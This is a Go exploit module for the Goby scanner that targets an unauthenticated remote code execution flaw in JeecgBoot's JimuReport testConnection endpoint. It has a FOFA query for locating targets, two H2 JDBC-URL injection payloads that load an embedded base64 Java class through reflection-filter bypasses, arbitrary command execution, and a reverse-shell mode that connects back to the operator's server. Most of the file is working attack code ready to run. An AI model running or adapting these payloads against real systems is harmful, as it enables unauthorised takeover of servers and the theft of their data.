package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Jeecg Boot JimuReport testConnection Remote Code Execution Vulnerability",
    "Description": "<p>JeecgBoot is an open source low-code development platform, and building block reports are the low-code report components.</p><p>The jeecg-boot/jmreport/testConnection of JeecgBoot is not authenticated, and the dbUrl parameter is not restricted. When the H2 database driver dependency exists on the application side, the attacker sends an http request containing a malicious dbUrl parameter to remotely execute arbitrary code.</p>",
    "Product": "JEECG",
    "Homepage": "http://www.jeecg.com/",
    "DisclosureDate": "2023-08-11",
    "PostTime": "2023-08-18",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "title==\"JeecgBoot 企业级低代码平台\" || body=\"window._CONFIG['imgDomainURL'] = 'http://localhost:8080/jeecg-boot/\" || title=\"Jeecg-Boot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || body=\"'http://fileview.jeecg.com/onlinePreview'\" || title==\"JeecgBoot 企业级低代码平台\" || title==\"Jeecg-Boot 企业级快速开发平台\" || title==\"JeecgBoot 企业级快速开发平台\" || title==\"JeecgBoot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || title=\"Jeecg-Boot 快速开发平台\" || body=\"积木报表\" || body=\"jmreport\"",
    "GobyQuery": "title==\"JeecgBoot 企业级低代码平台\" || body=\"window._CONFIG['imgDomainURL'] = 'http://localhost:8080/jeecg-boot/\" || title=\"Jeecg-Boot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || body=\"'http://fileview.jeecg.com/onlinePreview'\" || title==\"JeecgBoot 企业级低代码平台\" || title==\"Jeecg-Boot 企业级快速开发平台\" || title==\"JeecgBoot 企业级快速开发平台\" || title==\"JeecgBoot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || title=\"Jeecg-Boot 快速开发平台\" || body=\"积木报表\" || body=\"jmreport\"",
    "Level": "3",
    "Impact": "<p>Since the jeecg-boot/jmreport/testConnection Api interface is not authenticated and the dbUrl parameter is not restricted, when there is an H2 database driver dependency on the application side, the attacker sends an http request containing a malicious dbUrl parameter to remotely execute arbitrary code.</p>",
    "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/jeecgboot/jeecg-boot\">https://github.com/jeecgboot/jeecg-boot</a></p>",
    "References": [
        "https://www.oscs1024.com/hd/MPS-bjs4-n6dm"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10",
    "Translation": {
        "CN": {
            "Name": "Jeecg Boot JimuReport testConnection 远程代码执行漏洞",
            "Product": "JEECG",
            "Description": "<p>JeecgBoot 是一款开源的的低代码开发平台，积木报表是其中的低代码报表组件。</p><p>JeecgBoot 的 jeecg-boot/jmreport/testConnection 未进行身份验证，并且未对 dbUrl 参数进行限制，当应用端存在H2数据库驱动依赖时，攻击者发送包含恶意 dbUrl 参数的 http 请求远程执行任意代码。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/jeecgboot/jeecg-boot\" target=\"_blank\">https://github.com/jeecgboot/jeecg-boot</a><br></p>",
            "Impact": "<p>JeecgBoot 的 jeecg-boot/jmreport/testConnection 未进行身份验证，并且未对 dbUrl 参数进行限制，当应用端存在H2数据库驱动依赖时，攻击者发送包含恶意 dbUrl 参数的 http 请求远程执行任意代码。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Jeecg Boot JimuReport testConnection Remote Code Execution Vulnerability",
            "Product": "JEECG",
            "Description": "<p>JeecgBoot is an open source low-code development platform, and building block reports are the low-code report components.</p><p>The jeecg-boot/jmreport/testConnection of JeecgBoot is not authenticated, and the dbUrl parameter is not restricted. When the H2 database driver dependency exists on the application side, the attacker sends an http request containing a malicious dbUrl parameter to remotely execute arbitrary code.</p>",
            "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/jeecgboot/jeecg-boot\" target=\"_blank\">https://github.com/jeecgboot/jeecg-boot</a><br></p>",
            "Impact": "<p>Since the jeecg-boot/jmreport/testConnection Api interface is not authenticated and the dbUrl parameter is not restricted, when there is an H2 database driver dependency on the application side, the attacker sends an http request containing a malicious dbUrl parameter to remotely execute arbitrary code.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10826"
}`

	sendPayloadFlagKarS := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		payloadUri := ""
		for _, uri := range []string{`/jmreport/testConnection`, `/jeecg-boot/jmreport/testConnection`} {
			checkUriRequestConfig := httpclient.NewGetRequestConfig(uri)
			checkUriRequestConfig.VerifyTls = false
			checkUriRequestConfig.FollowRedirect = false
			rsp, err := httpclient.DoHttpRequest(hostInfo, checkUriRequestConfig)
			if err != nil {
				return nil, err
			}
			if !strings.HasPrefix(rsp.Utf8Html, `{`) && !strings.HasSuffix(rsp.Utf8Html, `}`) {
				continue
			}
			payloadUri = uri
			break
		}
		if payloadUri == "" {
			return nil, errors.New("漏洞利用失败")
		}
		payloadRequestConfig := httpclient.NewPostRequestConfig(payloadUri)
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store(`cmd`, cmd)
		payloadRequestConfig.Header.Store(`Content-Type`, `application/json`)
		tomcatEchoPayload := `yv66vgAAADEBawoAHQCSCgBEAJMKAEQAlAoAHQCVCACWCgAbAJcKAJgAmQoAmACaBwCbCgBEAJwIAIwKACAAnQgAnggAnwcAoAgAoQgAogcAowoAGwCkCAClCACmBwCnCwAWAKgLABYAqQgAqggAqwcArAoAGwCtBwCuCgCvALAIALEHALIIALMKAH4AtAoAIAC1CAC2CQAmALcHALgKACYAuQgAugoAfgC7CgAbALwIAL0HAL4KABsAvwgAwAcAwQgAwggAwwoAGwDEBwDFCgBEAMYKAMcAuwgAyAoAIADJCADKCgAgAMsIAMwKACAAzQoAIADOCADPCgAgANAIANEJAH4A0goAJgDTCgAmANQJAH4A1QcA1goARADXCgBEANgIAI0IANkKAH4A2ggA2woA3ADdCgAgAN4IAN8IAOAIAOEHAOIKAFAAkgoAUADjCADkCgBQAOUIAOYIAOcIAOgIAOkKAOoA6woA6gDsBwDtCgDuAO8KAFsA8AgA8QoAWwDyCgBbAPMKAFsA9AoA7gD1CgDuAPYKAC8A5QgA9woAIAD4CAD5CgDqAPoHAPsKACYA/AoAaQD9CgBpAO8KAO4A/goAaQD+CgBpAP8KAQABAQoBAAECCgEDAQQKAQMBBQUAAAAAAAAAMgoARAEGCgDuAQcKAGkBCAgBCQoALwEKCAELCAEMCgB+AQ0HAQ4BAAJpcAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBvcnQBABNMamF2YS9sYW5nL0ludGVnZXI7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAHZXhlY3V0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAB3JldmVyc2UBADkoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9JbnRlZ2VyOylMamF2YS9sYW5nL1N0cmluZzsBAANydW4BAApTb3VyY2VGaWxlAQAHQTQuamF2YQwAgwCEDAEPARAMAREBEgwBEwEUAQAHdGhyZWFkcwwBFQEWBwEXDAEYARkMARoBGwEAE1tMamF2YS9sYW5nL1RocmVhZDsMARwBHQwBHgEfAQAEaHR0cAEABnRhcmdldAEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEAB2hhbmRsZXIBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MASABFAEABmdsb2JhbAEACnByb2Nlc3NvcnMBAA5qYXZhL3V0aWwvTGlzdAwBIQEiDAEaASMBAANyZXEBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwBJAElAQAQamF2YS9sYW5nL09iamVjdAcBJgwBJwEoAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAwAigCLDAEpASoBAAlzZXRTdGF0dXMMASsBLAEAEWphdmEvbGFuZy9JbnRlZ2VyDACDAS0BACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsMAIgAiQwBLgEvAQAIc2V0Qnl0ZXMBAAJbQgwBMAElAQAHZG9Xcml0ZQEAE2phdmEvbGFuZy9FeGNlcHRpb24BABNqYXZhLm5pby5CeXRlQnVmZmVyAQAEd3JhcAwBMQCJAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24MATIBMwcBNAEAAAwBNQE2AQAQY29tbWFuZCBub3QgbnVsbAwBNwEdAQAFIyMjIyMMATgBOQwBOgE7AQABOgwBPAE9AQAiY29tbWFuZCByZXZlcnNlIGhvc3QgZm9ybWF0IGVycm9yIQwAfwCADAE+AT8MAUABQQwAgQCCAQAQamF2YS9sYW5nL1RocmVhZAwAgwFCDAFDAIQBAAVAQEBAQAwAjACLAQAHb3MubmFtZQcBRAwBRQCLDAFGAR0BAAN3aW4BAARwaW5nAQACLW4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBRwFIAQAFIC1uIDQMAUkBHQEAAi9jAQAFIC10IDQBAAJzaAEAAi1jBwFKDAFLAUwMAIwBTQEAEWphdmEvdXRpbC9TY2FubmVyBwFODAFPAVAMAIMBUQEAAlxhDAFSAVMMAVQBVQwBVgEdDAFXAVAMAVgAhAEABy9iaW4vc2gMAIMBWQEAB2NtZC5leGUMAIwBWgEAD2phdmEvbmV0L1NvY2tldAwBWwEiDACDAVwMAV0BXgwBXwFVBwFgDAFhASIMAWIBIgcBYwwBZAEtDAFlAIQMAWYBZwwBaAEiDAFpAIQBAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwBagEdAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEMAI0AjgEAAkE0AQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQANZ2V0U3VwZXJjbGFzcwEABHNpemUBAAMoKUkBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEKEkpVgEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEAB2Zvck5hbWUBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAEdHJpbQEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBABcoTGphdmEvbGFuZy9SdW5uYWJsZTspVgEABXN0YXJ0AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEADmdldEVycm9yU3RyZWFtAQAHZGVzdHJveQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEACGludFZhbHVlAQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgEAD2dldE91dHB1dFN0cmVhbQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEACGlzQ2xvc2VkAQATamF2YS9pby9J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`
		payloads := []string{`{
           "id":"1",
           "code":"ABC",
           "dbType":"MySQL",
           "dbDriver":"org.h2.Driver",
           "dbUrl":"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes\\;try{bytes=java.util.Base64.getDecoder().decode(b)\\;}catch (Exception e){e.printStackTrace()\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\;}java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\\\"defineClass\\\", byte[].class,int.class,int.class)\\;defineClassMethod.setAccessible(true)\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\;clz.newInstance()\\;}'\\;CALL EXEC('` + tomcatEchoPayload + `')",
           "dbName":"` + goutils.RandomHexString(16) + `",
           "dbPassword":"` + goutils.RandomHexString(16) + `",
           "userName":"` + goutils.RandomHexString(16) + `"
        }`, `{
           "id":"1",
           "code":"ABC",
           "dbType":"MySQL",
           "dbDriver":"org.h2.Driver",
           "dbUrl":"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=DROP TRIGGER IF EXISTS shell3;CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\ntry{load('nashorn:mozilla_compat.js')}catch(e){}function getUnsafe(){var theUnsafeMethod=java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');theUnsafeMethod.setAccessible(true);return theUnsafeMethod.get(null)}function removeClassCache(clazz){var unsafe=getUnsafe();var clazzAnonymousClass=unsafe.defineAnonymousClass(clazz,java.lang.Class.forName('java.lang.Class').getResourceAsStream('Class.class').readAllBytes(),null);var reflectionDataField=clazzAnonymousClass.getDeclaredField('reflectionData');unsafe.putObject(clazz,unsafe.objectFieldOffset(reflectionDataField),null)}function bypassReflectionFilter(){var reflectionClass;try{reflectionClass=java.lang.Class.forName('jdk.internal.reflect.Reflection')}catch(error){reflectionClass=java.lang.Class.forName('sun.reflect.Reflection')}var unsafe=getUnsafe();var classBuffer=reflectionClass.getResourceAsStream('Reflection.class').readAllBytes();var reflectionAnonymousClass=unsafe.defineAnonymousClass(reflectionClass,classBuffer,null);var fieldFilterMapField=reflectionAnonymousClass.getDeclaredField('fieldFilterMap');var methodFilterMapField=reflectionAnonymousClass.getDeclaredField('methodFilterMap');if(fieldFilterMapField.getType().isAssignableFrom(java.lang.Class.forName('java.util.HashMap'))){unsafe.putObject(reflectionClass,unsafe.staticFieldOffset(fieldFilterMapField),java.lang.Class.forName('java.util.HashMap').getConstructor().newInstance())}if(methodFilterMapField.getType().isAssignableFrom(java.lang.Class.forName('java.util.HashMap'))){unsafe.putObject(reflectionClass,unsafe.staticFieldOffset(methodFilterMapField),java.lang.Class.forName('java.util.HashMap').getConstructor().newInstance())}removeClassCache(java.lang.Class.forName('java.lang.Class'))}function setAccessible(accessibleObject){var unsafe=getUnsafe();var overrideField=java.lang.Class.forName('java.lang.reflect.AccessibleObject').getDeclaredField('override');var offset=unsafe.objectFieldOffset(overrideField);unsafe.putBoolean(accessibleObject,offset,true)}function defineClass(bytes){var clz=null;var version=java.lang.System.getProperty('java.version');var unsafe=getUnsafe();var classLoader=new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName('java.net.URL'),0));try{if(version.split('.')[0]>=11){bypassReflectionFilter();defineClassMethod=java.lang.Class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass',java.lang.Class.forName('[B'),java.lang.Integer.TYPE,java.lang.Integer.TYPE);setAccessible(defineClassMethod);clz=defineClassMethod.invoke(classLoader,bytes,0,bytes.length)}else{var protectionDomain=new java.security.ProtectionDomain(new java.security.CodeSource(null,java.lang.reflect.Array.newInstance(java.lang.Class.forName('java.security.cert.Certificate'),0)),null,classLoader,[]);clz=unsafe.defineClass(null,bytes,0,bytes.length,classLoader,protectionDomain)}}catch(error){error.printStackTrace()}finally{return clz}}function base64DecodeToByte(str){var bt;try{bt=java.lang.Class.forName('sun.misc.BASE64Decoder').newInstance().decodeBuffer(str)}catch(e){}if(bt==null){try{bt=java.lang.Class.forName('java.util.Base64').newInstance().getDecoder().decode(str)}catch(e){}}if(bt==null){try{bt=java.util.Base64.getDecoder().decode(str)}catch(e){}}if(bt==null){bt=java.lang.Class.forName('org.apache.commons.codec.binary.Base64').newInstance().decode(str)}return bt}var code='` + tomcatEchoPayload + `';defineClass(base64DecodeToByte(code)).newInstance()$$",
           "dbName":"` + goutils.RandomHexString(16) + `",
           "dbPassword":"` + goutils.RandomHexString(16) + `",
           "userName":"` + goutils.RandomHexString(16) + `"
        }`}
		for _, payload := range payloads {
			payloadRequestConfig.Data = payload
			rsp, err := httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
			if err != nil {
				return nil, err
			}
			if strings.Contains(rsp.Utf8Html, `驱动类不存在`) {
				return nil, errors.New("漏洞利用失败")
			}
			if strings.Contains(rsp.Utf8Html, `Unsupported`) || strings.Contains(rsp.Utf8Html, `"success":false`) || strings.Contains(rsp.Utf8Html, `"code": 500`) {
				continue
			}
			return rsp, err
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			rsp, _ := sendPayloadFlagKarS(hostInfo, `echo `+checkStr)
			return rsp != nil && strings.Contains(rsp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			cmd := goutils.B2S(ss.Params["cmd"])
			waitSessionCh := make(chan string)
			if attackType == "reverse" {
				rp, err := godclient.WaitSession("reverse", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				cmd = fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp)
				sendPayloadFlagKarS(expResult.HostInfo, cmd)
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "cmd" {
				rsp, err := sendPayloadFlagKarS(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, `{"success"`) {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html[:strings.Index(rsp.Utf8Html, `{"success"`)]
				} else {
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
